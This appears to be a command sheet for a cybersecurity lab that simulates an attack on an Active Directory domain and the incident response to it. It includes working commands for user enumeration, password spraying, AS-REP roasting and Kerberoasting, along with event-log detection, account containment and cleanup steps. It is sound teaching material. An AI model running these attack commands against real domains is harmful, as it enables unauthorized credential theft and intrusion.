# Commands: Lab 08 - Enterprise Attack Simulation & Incident Response

🐉 = Kali (attacker). 🪟 = Windows Server / DC01 (victim + IR). Password strings use **single quotes** in the shell because `!` triggers history expansion in bash/zsh.

## Phase 0: Setup (DC)

```powershell
# Plant a weak-but-policy-compliant service account (the vulnerability).
New-ADUser -Name "Backup Service" -SamAccountName "svc-backup" -UserPrincipalName "svc-backup@CYBERLAB.local" `
  -AccountPassword (ConvertTo-SecureString "Welcome2025!!!" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true -Description "Backup service account"
```

## Phase 1: Reconnaissance 🐉

```bash
nmap -Pn -sV 192.168.56.30
```

## Phase 2: User Enumeration (unauthenticated) 🐉

```bash
printf 'administrator\njdoe\njsmith\nasmith\nbsmith\nsvc-backup\nsvc-sql\nadmin\nbackup\nguest\nmjones\njohn.doe\n' > ~/userlist.txt
wget -q https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_linux_amd64 -O ~/kerbrute && chmod +x ~/kerbrute
~/kerbrute userenum -d CYBERLAB.local --dc 192.168.56.30 ~/userlist.txt
```

## Phase 3: Password Spray 🐉

```bash
printf 'administrator\nsvc-backup\nasmith\njdoe\n' > ~/valid_users.txt
printf 'Autumn2025!\nWelcome2025!!!\nPassword2025!\n' > ~/spray.txt      # single quotes protect the !
nxc smb 192.168.56.30 -u ~/valid_users.txt -p ~/spray.txt --continue-on-success
# -> [+] CYBERLAB.local\svc-backup:Welcome2025!!!
```

## Phase 4: Post-Exploitation 🐉

```bash
nxc smb 192.168.56.30 -u svc-backup -p 'Welcome2025!!!' --users
nxc smb 192.168.56.30 -u svc-backup -p 'Welcome2025!!!' --shares
```

## Extra A: AS-REP Roasting

```powershell
# 🪟 DC: simulate the misconfiguration (pre-auth disabled on asmith).
Set-ADAccountControl -Identity asmith -DoesNotRequirePreAuth $true
Get-ADUser asmith -Properties DoesNotRequirePreAuth | Select Name, DoesNotRequirePreAuth
```
```bash
# 🐉 Kali: grab the AS-REP hash unauthenticated, then crack offline.
impacket-GetNPUsers CYBERLAB.local/ -usersfile ~/valid_users.txt -dc-ip 192.168.56.30 -no-pass -format hashcat -outputfile ~/asrep_hashes.txt
cat ~/asrep_hashes.txt
printf 'Password123\nSummer2025\nCyberLabP@ss2025\nWelcome1\nAutumn2025\n' > ~/cracklist.txt
john --wordlist=~/cracklist.txt ~/asrep_hashes.txt
john --show ~/asrep_hashes.txt
```
```powershell
# 🪟 DC: detect (Event 4768, pre-auth type 0) and remediate.
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4768;StartTime=(Get-Date).AddMinutes(-15)} | Where-Object { $_.Message -match 'asmith' } | Select-Object -First 1 | Format-List TimeCreated, Message
Set-ADAccountControl -Identity asmith -DoesNotRequirePreAuth $false
Set-ADAccountPassword -Identity asmith -Reset -NewPassword (ConvertTo-SecureString "Zt9pQ2mLx7Kv4nWr8Yd" -AsPlainText -Force)
```

## Extra B: Kerberoasting

```powershell
# 🪟 DC: service account with an SPN and a weak password (the target).
New-ADUser -Name "SQL Service" -SamAccountName "svc-sql" -UserPrincipalName "svc-sql@CYBERLAB.local" `
  -AccountPassword (ConvertTo-SecureString "Summer2025Db!!" -AsPlainText -Force) -Enabled $true -PasswordNeverExpires $true `
  -ServicePrincipalNames "MSSQL/dc01.cyberlab.local:1433"
Get-ADUser svc-sql -Properties ServicePrincipalNames | Select Name, ServicePrincipalNames
```
```bash
# 🐉 Kali: request the TGS with any valid domain cred (jdoe foothold), then crack offline.
impacket-GetUserSPNs CYBERLAB.local/jdoe:'CyberLabP@ss2025' -dc-ip 192.168.56.30 -request -outputfile ~/kerberoast_hashes.txt
cat ~/kerberoast_hashes.txt
printf 'Password123\nSummer2025Db!!\nWelcome1\nAutumn2025\n' > ~/krb_wordlist.txt
john --wordlist=~/krb_wordlist.txt ~/kerberoast_hashes.txt
john --show ~/kerberoast_hashes.txt
# If KRB_AP_ERR_SKEW: sudo rdate -n 192.168.56.30   (sync clock to the DC)
```
```powershell
# 🪟 DC: detect (Event 4769, enc type 0x17 = RC4) and remediate (long random password / gMSA).
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4769;StartTime=(Get-Date).AddMinutes(-15)} | Where-Object { $_.Message -match 'svc-sql' } | Select-Object -First 1 | Format-List TimeCreated, Message
Set-ADAccountPassword -Identity svc-sql -Reset -NewPassword (ConvertTo-SecureString "Kp9mXr2vLt7qNw4zBd6hCe3sYf8" -AsPlainText -Force)
```

## Phase 5: Incident Response (DC)

```powershell
# Attack volume.
(Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625;StartTime=(Get-Date).AddHours(-1)} -ErrorAction SilentlyContinue).Count

# Spray signature: failed logons grouped by targeted account.
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4625;StartTime=(Get-Date).AddHours(-1)} -ErrorAction SilentlyContinue |
  ForEach-Object { ([xml]$_.ToXml()).Event.EventData.Data.Where({$_.Name -eq 'TargetUserName'}).'#text' } |
  Group-Object | Sort-Object Count -Descending | Format-Table Count, Name -AutoSize

# The breach: successful network logon of svc-backup + attacker source IP.
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4624} -MaxEvents 80 |
  Where-Object { $_.Message -match 'svc-backup' -and $_.Message -match 'Logon Type:\s+3' } |
  Select-Object -First 1 | Format-List TimeCreated, Message
```

## Phase 6: Containment (DC)

```powershell
Disable-ADAccount -Identity svc-backup
Set-ADAccountPassword -Identity svc-backup -Reset -NewPassword (ConvertTo-SecureString "Xq7vR2pLm9Kt4zWn6Qd" -AsPlainText -Force)
Get-ADUser svc-backup | Select Name, Enabled      # Enabled: False
```
```bash
# 🐉 Kali: confirm access revoked.
nxc smb 192.168.56.30 -u svc-backup -p 'Welcome2025!!!' --continue-on-success   # -> STATUS_ACCOUNT_DISABLED
```

## Cleanup (optional, after the lab)

```powershell
# Remove the lab-only accounts if you want a tidy domain.
Remove-ADUser svc-backup -Confirm:$false
Remove-ADUser svc-sql -Confirm:$false
```
